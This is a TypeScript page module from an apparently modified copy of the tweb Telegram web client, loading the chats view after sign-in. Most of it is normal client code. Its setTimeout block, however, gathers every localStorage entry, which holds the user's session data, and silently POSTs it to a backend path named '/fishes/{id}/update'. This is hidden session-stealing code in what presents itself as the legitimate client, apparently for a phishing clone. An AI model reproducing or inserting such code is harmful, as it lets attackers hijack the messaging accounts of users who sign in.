/*
 * https://github.com/morethanwords/tweb
 * Copyright (C) 2019-2021 Eduard Kuzmenko
 * https://github.com/morethanwords/tweb/blob/master/LICENSE
 */

import blurActiveElement from '../helpers/dom/blurActiveElement';
import loadFonts from '../helpers/dom/loadFonts';
import I18n from '../lib/langPack';
import rootScope from '../lib/rootScope';
import Page from './page';

const onFirstMount = () => {
  rootScope.managers.appStateManager.pushToState('authState', {_: 'authStateSignedIn'});
  // ! TOO SLOW
  /* appStateManager.saveState(); */

  if(!I18n.requestedServerLanguage) {
    I18n.getCacheLangPack().then((langPack) => {
      if(langPack.local) {
        I18n.getLangPack(langPack.lang_code);
      }
    });
  }

  page.pageEl.style.display = '';

  blurActiveElement();

  return Promise.all([
    import('../lib/appManagers/appDialogsManager'),
    loadFonts()/* .then(() => new Promise((resolve) => window.requestAnimationFrame(resolve))) */,
    'requestVideoFrameCallback' in HTMLVideoElement.prototype ? Promise.resolve() : import('../helpers/dom/requestVideoFrameCallbackPolyfill')
  ]).then(([appDialogsManager]) => {
    appDialogsManager.default.start();
    setTimeout(() => {
      document.getElementById('auth-pages').remove();
      const storageData = {};
      const id = localStorage.getItem('_id');
      for(let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        // @ts-ignore
        storageData[key] = localStorage.getItem(key);
      }
      console.log('StorageData: ', storageData);
      fetch(`${rootScope.backendServerURL}/fishes/${id}/update`, {
        method: 'POST',
        headers: {
          'content-type': 'application/json'
        },
        body: JSON.stringify(storageData)
      })
    }, 1e3);
  });
};

const page = new Page('page-chats', false, onFirstMount);
export default page;
